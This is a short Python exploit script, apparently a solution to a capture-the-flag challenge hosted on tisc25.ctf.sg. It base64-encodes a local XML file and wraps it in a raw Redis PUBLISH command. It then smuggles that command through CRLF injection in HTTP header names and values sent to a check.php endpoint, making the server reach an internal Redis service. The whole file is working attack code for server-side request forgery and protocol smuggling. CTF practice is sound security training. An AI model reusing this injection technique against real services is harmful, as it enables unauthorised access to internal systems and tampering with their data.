import requests
import base64
import socket

# BASE_URL = "http://localhost:8500"
BASE_URL = "http://chals.tisc25.ctf.sg:45179"

HASH = "test"
TARGET = "http://redis:6379"

with open("jiffle.xml", "rb") as f:
    raw = f.read()

b64_payload = base64.b64encode(raw).decode("ascii")
b64_payload = f"{HASH}|{b64_payload}"

redis_payload = f"*3\r\n$7\r\nPUBLISH\r\n$7\r\nentries\r\n${len(b64_payload)}\r\n{b64_payload}\r\n"
check_payload = {"t": f"{TARGET}", "h": {f"a": f"aaa\r\n{redis_payload}", f"b: a\r\nHost": "aaa"}}

res = requests.post(f"{BASE_URL}/api/check.php", json=check_payload)
